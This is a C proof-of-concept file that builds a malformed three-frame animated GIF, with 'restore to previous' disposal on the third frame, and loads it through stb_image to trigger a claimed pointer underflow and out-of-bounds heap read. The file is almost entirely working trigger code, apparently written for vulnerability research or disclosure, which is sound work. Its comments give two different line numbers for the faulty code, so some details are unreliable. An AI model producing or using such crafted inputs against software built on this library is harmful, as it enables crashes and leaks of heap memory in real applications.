// PoC: H2 -- GIF animated two_back pointer underflow
//
// Generates a minimal animated GIF with 3 frames where frame 3 uses
// disposal method 3 ("restore to previous"). stb_image computes
// two_back = out - 2 * stride, which points BEFORE the heap buffer.
// The memcpy at line 6818 then reads from this invalid address.
//
// Build: gcc -o poc_gif_twoback poc_gif_twoback.c
// Run:   ./poc_gif_twoback
//        Writes "twoback.gif" then loads it. Will likely crash or
//        read heap data from before the allocation.

#define STB_IMAGE_IMPLEMENTATION
#include "../stb/stb_image.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// minimal GIF89a encoder (just enough for 3 frames)
static void put16le(uint8_t *p, uint16_t v) {
    p[0] = v & 0xff;
    p[1] = (v >> 8) & 0xff;
}

// minimal LZW-compressed 2x2 image (all pixels = 0)
// min code size = 2, data: clear(4), 0, 0, 0, 0, end(5)
static const uint8_t lzw_data[] = {
    0x02,       // min code size = 2
    0x05,       // block size = 5 bytes
    0x84, 0x00, 0x01, 0x44, 0x01, // compressed: clear, 0,0,0,0, end
    0x00        // block terminator
};

static void write_frame(FILE *f, int disposal) {
    // graphic control extension
    uint8_t gce[] = {
        0x21, 0xf9,  // extension introducer + GCE label
        0x04,        // block size
        (uint8_t)((disposal & 7) << 2), // disposal method
        0x0a, 0x00,  // delay (10 * 10ms = 100ms)
        0x00,        // transparent color index (none)
        0x00         // block terminator
    };
    fwrite(gce, 1, sizeof(gce), f);

    // image descriptor
    uint8_t desc[] = {
        0x2c,              // image separator
        0x00, 0x00,        // left
        0x00, 0x00,        // top
        0x02, 0x00,        // width = 2
        0x02, 0x00,        // height = 2
        0x00               // no local color table
    };
    fwrite(desc, 1, sizeof(desc), f);

    // LZW image data
    fwrite(lzw_data, 1, sizeof(lzw_data), f);
}

int main(void) {
    const char *filename = "twoback.gif";

    FILE *f = fopen(filename, "wb");
    if (!f) { perror("fopen"); return 1; }

    // GIF89a header
    uint8_t header[] = {
        'G','I','F','8','9','a',
        0x02, 0x00,  // width = 2
        0x02, 0x00,  // height = 2
        0xf0,        // GCT flag, 1 bit color resolution, 2 colors
        0x00,        // bg color index
        0x00         // pixel aspect ratio
    };
    fwrite(header, 1, sizeof(header), f);

    // global color table (2 entries: black, white)
    uint8_t gct[] = {
        0x00, 0x00, 0x00,  // black
        0xff, 0xff, 0xff   // white
    };
    fwrite(gct, 1, sizeof(gct), f);

    // netscape looping extension (required for animated GIF)
    uint8_t netscape[] = {
        0x21, 0xff, 0x0b,
        'N','E','T','S','C','A','P','E','2','.','0',
        0x03, 0x01, 0x00, 0x00, 0x00
    };
    fwrite(netscape, 1, sizeof(netscape), f);

    // frame 1: disposal = 0 (none)
    write_frame(f, 0);

    // frame 2: disposal = 0 (none)
    write_frame(f, 0);

    // frame 3: disposal = 3 (restore to previous)
    // this triggers the two_back pointer underflow
    write_frame(f, 3);

    // trailer
    uint8_t trailer = 0x3b;
    fwrite(&trailer, 1, 1, f);

    fclose(f);

    printf("wrote %s (3-frame animated GIF, frame 3 has disposal=3)\n", filename);
    printf("loading with stb_image...\n\n");

    int x, y, frames, *delays = NULL;
    // stbi_load_gif_from_memory or file
    FILE *fin = fopen(filename, "rb");
    fseek(fin, 0, SEEK_END);
    long fsize = ftell(fin);
    fseek(fin, 0, SEEK_SET);
    uint8_t *buf = malloc(fsize);
    fread(buf, 1, fsize, fin);
    fclose(fin);

    stbi_uc *data = stbi_load_gif_from_memory(buf, (int)fsize, &delays, &x, &y, &frames, NULL, 4);

    if (!data) {
        printf("stbi_load_gif_from_memory failed: %s\n", stbi_failure_reason());
        printf("\nthis is expected if ASAN caught the OOB read.\n");
        printf("build with -fsanitize=address to see the exact violation.\n");
        free(buf);
        return 1;
    }

    printf("loaded %d frames, %dx%d\n", frames, x, y);
    printf("the two_back pointer computation at stb_image.h:7023 is:\n");
    printf("  two_back = out - 2 * stride\n");
    printf("  stride = %d * %d * 4 = %d\n", x, y, x*y*4);
    printf("  two_back points %d bytes BEFORE the heap allocation\n\n", 2 * x * y * 4);

    printf("frame 3 with disposal=3 reads from this invalid pointer.\n");
    printf("build with -fsanitize=address to confirm the OOB read.\n");

    stbi_image_free(data);
    free(delays);
    free(buf);
    return 0;
}
